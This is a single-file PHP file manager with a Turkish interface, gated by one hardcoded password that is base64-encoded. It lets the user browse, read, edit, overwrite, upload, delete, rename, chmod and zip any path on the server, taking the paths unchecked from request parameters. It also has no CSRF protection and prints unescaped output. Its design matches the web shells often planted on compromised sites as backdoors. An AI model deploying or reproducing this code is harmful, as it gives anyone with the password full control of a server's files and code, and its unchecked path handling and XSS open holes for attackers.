<?php
error_reporting(1);
session_start();

$dogru_sifre = base64_decode('S2FwbGFuITIwMjU=');

if(!isset($_SESSION['authenticated'])) {
    if(isset($_POST['password'])) {
        if($_POST['password'] === $dogru_sifre) {
            session_regenerate_id(true);
            $_SESSION['authenticated'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            echo "<div class='alert alert-danger mt-4'>Hatalı şifre!</div>";
        }
    }
    echo "<form action='' method='post'>
            <label for='password'>Şifre:</label>
            <input type='password' name='password' required>
            <input type='submit' value='Giriş Yap'>
          </form>";
    exit;
}

if (isset($_POST['icerik']) && isset($_POST['dosya_yolu'])) {
    $icerik = $_POST['icerik'];
    $dosya_yolu = $_POST['dosya_yolu'];
    file_put_contents($dosya_yolu, $icerik);
    header('Location: ?dizin=' . (isset($_POST['dizin'])?$_POST['dizin']:urlencode(dirname($dosya_yolu))) . '&msg=saved');
    exit;
}

if (!empty($_POST['action'])) {
    $action = $_POST['action'];
    $dizin = isset($_POST['dizin']) ? $_POST['dizin'] : __DIR__;
    if ($action === 'mkdir') {
        $name = isset($_POST['name']) ? trim($_POST['name']) : '';
        if ($name !== '' && strpos($name, '/') === false && strpos($name, '\\') === false && $name !== '.' && $name !== '..') {
            @mkdir($dizin . '/' . $name, 0755, false);
            header('Location: ?dizin=' . $dizin . '&msg=mkdir_ok');
            exit;
        } else {
            header('Location: ?dizin=' . $dizin . '&msg=mkdir_err');
            exit;
        }
    } elseif ($action === 'rename') {
        $old = isset($_POST['old']) ? $_POST['old'] : '';
        $name = isset($_POST['name']) ? trim($_POST['name']) : '';
        if ($old !== '' && $name !== '' && strpos($name, '/') === false && strpos($name, '\\') === false && $name !== '.' && $name !== '..') {
            $target = dirname($old) . '/' . $name;
            @rename($old, $target);
            header('Location: ?dizin=' . $dizin . '&msg=rename_ok');
            exit;
        } else {
            header('Location: ?dizin=' . $dizin . '&msg=rename_err');
            exit;
        }
    }
}

if(isset($_GET['download'])) {
    $dosya_yolu = $_GET['download'];
    if(file_exists($dosya_yolu)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($dosya_yolu).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($dosya_yolu));
        flush();
        readfile($dosya_yolu);
        exit;
    } else {
        echo "<div class='alert alert-danger mt-4'>Dosya bulunamadı!</div>";
    }
}

if(isset($_GET['delete'])) {
    $dosya_yolu = $_GET['delete'];
    $geri = isset($_GET['dizin']) ? $_GET['dizin'] : __DIR__;
    if(file_exists($dosya_yolu)) {
        @unlink($dosya_yolu);
        clearstatcache(true, $dosya_yolu);
        header('Location: ?dizin=' . $geri . '&msg=deleted');
        exit;
    } else {
        header('Location: ?dizin=' . $geri . '&msg=del_notfound');
        exit;
    }
}

if(isset($_GET['delete_dir'])) {
    $klasor_yolu = $_GET['delete_dir'];
    if(is_dir($klasor_yolu)) {
        if(deleteDirectory($klasor_yolu)) {
            echo "<div class='alert alert-success mt-4'>Klasör ve içeriği başarıyla silindi!</div>";
        } else {
            echo "<div class='alert alert-danger mt-4'>Klasör ve içeriği silinirken bir hata oluştu!</div>";
        }
    } else {
        echo "<div class='alert alert-danger mt-4'>Klasör bulunamadı!</div>";
    }
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        if (is_file($path) || is_link($path)) {
            @unlink($path);
        } elseif (is_dir($path)) {
            deleteDirectory($path);
        }
    }
    if (is_dir($dir)) {
        return @rmdir($dir);
    }
    return true;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Dosya Yöneticisi</title>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
<style>
    body { padding-top: 20px; }
</style>
<script>
function izinleriDuzenle(yol, mevcutIzinler) {
    const yeniIzinler = prompt("Yeni izinleri girin (örn. 0755):", mevcutIzinler);
    if (yeniIzinler !== null) {
        window.location.href = `?dizin=${(typeof CURRENT_DIR!=='undefined'?CURRENT_DIR:'')}&chmod=${encodeURIComponent(yol)}&izinler=${encodeURIComponent(yeniIzinler)}`;
    }
}
function postAction(action, fields) {
    var f = document.createElement('form');
    f.method = 'post';
    f.action = '';
    var a = document.createElement('input'); a.type='hidden'; a.name='action'; a.value=action; f.appendChild(a);
    for (var k in fields) { if (!fields.hasOwnProperty(k)) continue; var i=document.createElement('input'); i.type='hidden'; i.name=k; i.value=fields[k]; f.appendChild(i); }
    document.body.appendChild(f);
    f.submit();
}
function yeniKlasor(dizin) {
    var ad = prompt('Yeni klasör adı:');
    if (ad !== null) { ad = ad.trim(); if (ad !== '') postAction('mkdir', {dizin: dizin, name: ad}); }
}
function yenidenAdlandir(tamYol, mevcutAd, dizin) {
    var ad = prompt('Yeni ad:', mevcutAd);
    if (ad !== null) { ad = ad.trim(); if (ad !== '') postAction('rename', {dizin: dizin, old: tamYol, name: ad}); }
}
</script>
</head>
<body>
<div class="container">
<?php
if(isset($_GET['msg'])) {
    $m = $_GET['msg'];
    if($m==='saved') echo "<div class='alert alert-success mt-2'>Dosya güncellendi.</div>";
    elseif($m==='mkdir_ok') echo "<div class='alert alert-success mt-2'>Klasör oluşturuldu.</div>";
    elseif($m==='mkdir_err') echo "<div class='alert alert-danger mt-2'>Klasör oluşturulamadı.</div>";
    elseif($m==='rename_ok') echo "<div class='alert alert-success mt-2'>Yeniden adlandırma başarılı.</div>";
    elseif($m==='rename_err') echo "<div class='alert alert-danger mt-2'>Yeniden adlandırma başarısız.</div>";
    elseif($m==='deleted') echo "<div class='alert alert-success mt-2'>Dosya silindi.</div>";
    elseif($m==='del_notfound') echo "<div class='alert alert-danger mt-2'>Silinecek dosya bulunamadı.</div>";
}

function klasor_adi_degistir($eski_ad, $yeni_ad) {
    if (is_dir($eski_ad)) {
        if (!file_exists($yeni_ad)) {
            if (rename($eski_ad, $yeni_ad)) {
                echo "<div class='alert alert-success'>Klasor basariyla degistirildi: $eski_ad -> $yeni_ad</div>";
            } else {
                echo "<div class='alert alert-danger'>Klasor adi degistirilemedi.</div>";
            }
        } else {
            echo "<div class='alert alert-warning'>Yeni klasor adi zaten mevcut: $yeni_ad</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Degistirilecek klasor bulunamadi: $eski_ad</div>";
    }
}

if(isset($_FILES['dosya'])) {
    $hedef_dizin = isset($_GET['dizin']) ? $_GET['dizin'] : __DIR__;
    $dosya_adı = $_FILES['dosya']['name'];
    $geçici_ad = $_FILES['dosya']['tmp_name'];
    $hedef_ad = $hedef_dizin . '/' . $dosya_adı;
    if(move_uploaded_file($geçici_ad, $hedef_ad)) {
        echo "<div class='alert alert-success mt-4'>Dosya başarıyla yüklendi!</div>";
    } else {
        echo "<div class='alert alert-danger mt-4'>Dosya yüklenirken bir hata oluştu!</div>";
    }
}

if(isset($_GET['dizin'])) { $dizin = $_GET['dizin']; } else { $dizin = __DIR__; }
if(isset($_GET['edit'])) { $dizin = dirname($_GET['edit']); }

if (isset($_GET['chmod']) && isset($_GET['izinler'])) {
    $dosya_yolu = $_GET['chmod'];
    $yeni_izinler = octdec($_GET['izinler']);
    if (chmod($dosya_yolu, $yeni_izinler)) {
        echo "<div class='alert alert-success mt-4'>Dosya izinleri güncellendi!</div>";
    } else {
        echo "<div class='alert alert-danger mt-4'>Dosya izinleri güncellenemedi!</div>";
    }
}

$dosyalar = scandir($dizin);
$dosya_listesi = [];
foreach ($dosyalar as $dosya) {
    if ($dosya != "." && $dosya != "..") {
        $dosya_yolu = $dizin . '/' . $dosya;
        $izinler = substr(sprintf('%o', fileperms($dosya_yolu)), -4);
        $dosya_listesi[] = [
            'isim' => $dosya,
            'yol' => $dosya_yolu,
            'tarih' => filemtime($dosya_yolu),
            'izinler' => $izinler
        ];
    }
}
usort($dosya_listesi, function($a, $b) { return $b['tarih'] - $a['tarih']; });

echo "<script>const CURRENT_DIR = " . json_encode($dizin) . ";</script>";

echo "<table class='table table-striped mt-4'>";
echo "<thead><tr><th>Dosya Adı</th><th>Değiştirilme Tarihi</th><th>İzinler</th><th>İşlemler</th></tr></thead><tbody>";
$ust_dizin_yolu = dirname($dizin);
echo "<tr><td colspan='4'><a href='?dizin=" . $ust_dizin_yolu . "'>... Üst Dizin</a></td></tr>";

foreach ($dosya_listesi as $dosya) {
    $dosya_yolu = $dosya['yol'];
    $dosya_tarih = date('d.m.Y H:i:s', $dosya['tarih']);
    $dosya_izinler = $dosya['izinler'];
    $url_dizin = $dizin;
    $url_yol = urlencode($dosya_yolu);
    $safe_yol_js = htmlspecialchars($dosya_yolu, ENT_QUOTES, 'UTF-8');
    $safe_isim_js = htmlspecialchars($dosya['isim'], ENT_QUOTES, 'UTF-8');
    if (is_dir($dosya_yolu)) {
        echo "<tr><td><a href='?dizin=" . $dosya_yolu . "'>{$dosya['isim']} (klasör)</a></td><td>$dosya_tarih</td><td><a href='javascript:void(0)' onclick=\"izinleriDuzenle('$safe_yol_js','$dosya_izinler')\">$dosya_izinler</a></td>
              <td>
                <a href='javascript:void(0)' class='btn btn-secondary btn-sm' onclick=\"yenidenAdlandir('$safe_yol_js','$safe_isim_js',CURRENT_DIR)\">Yeniden Adlandır</a>
                <a href='?dizin=$url_dizin&delete_dir=$url_yol' class='btn btn-danger btn-sm'>Klasörü Sil</a>
              </td></tr>";
    } else {
        echo "<tr><td>{$dosya['isim']}</td><td>$dosya_tarih</td><td><a href='javascript:void(0)' onclick=\"izinleriDuzenle('$safe_yol_js','$dosya_izinler')\">$dosya_izinler</a></td>
              <td>
                  <a href='?dizin=$url_dizin&edit=$url_yol' class='btn btn-primary btn-sm'>Düzenle</a>
                  <a href='javascript:void(0)' class='btn btn-secondary btn-sm' onclick=\"yenidenAdlandir('$safe_yol_js','$safe_isim_js',CURRENT_DIR)\">Yeniden Adlandır</a>
                  <a href='?dizin=$url_dizin&delete=$url_yol' class='btn btn-danger btn-sm'>Sil</a>
                  <a href='?dizin=$url_dizin&download=$url_yol' class='btn btn-success btn-sm'>İndir</a>
              </td></tr>";
    }
}
echo "</tbody></table>";

echo "<h2 class='mt-4'>Dosya Yükleme</h2>";
echo "<form action='' method='post' enctype='multipart/form-data'>";
echo "<div class='form-group'>";
echo "<input type='file' name='dosya' class='form-control-file'>";
echo "</div>";
echo "<input type='submit' value='Yükle' class='btn btn-primary'>";
echo "</form>";

if(isset($_GET['edit'])) {
    $dosya_yolu = $_GET['edit'];
    if(file_exists($dosya_yolu)) {
        echo "<h2 class='mt-4'>Dosya Düzenleme</h2>";
        echo "<form action='' method='post'>";
        echo "<textarea name='icerik' class='form-control' rows='10'>" . file_get_contents($dosya_yolu) . "</textarea><br>";
        echo "<input type='hidden' name='dizin' value='" . htmlspecialchars($dizin, ENT_QUOTES, 'UTF-8') . "'>";
        echo "<input type='hidden' name='dosya_yolu' value='" . htmlspecialchars($dosya_yolu, ENT_QUOTES, 'UTF-8') . "'>";
        echo "<input type='submit' value='Kaydet' class='btn btn-primary'>";
        echo "</form>";
    } else {
        echo "<div class='alert alert-danger mt-4'>Dosya bulunamadı!</div>";
    }
}

if(isset($_GET['zip'])) {
    $zip_dosya_adi = 'dosyalar.zip';
    $zip = new ZipArchive();
    if ($zip->open($zip_dosya_adi, ZipArchive::CREATE) === TRUE) {
        foreach ($dosyalar as $dosya) {
            if ($dosya != "." && $dosya != "..") {
                $dosya_yolu = $dizin . '/' . $dosya;
                $zip->addFile($dosya_yolu, $dosya);
            }
        }
        $zip->close();
        header('Content-Type: application/zip');
        header("Content-Disposition: attachment; filename=$zip_dosya_adi");
        readfile($zip_dosya_adi);
        unlink($zip_dosya_adi);
        exit;
    } else {
        echo "<div class='alert alert-danger mt-4'>ZIP dosyası oluşturulamadı!</div>";
    }
}
?>
<a href="?zip=1&dizin=<?php echo $dizin; ?>" class="btn btn-primary mt-4">Tüm Dosyaları ZIP İndir</a>
<button type="button" class="btn btn-secondary mt-4 ml-2" onclick="yeniKlasor(CURRENT_DIR)">Yeni Klasör</button>
</div>
</body>
</html>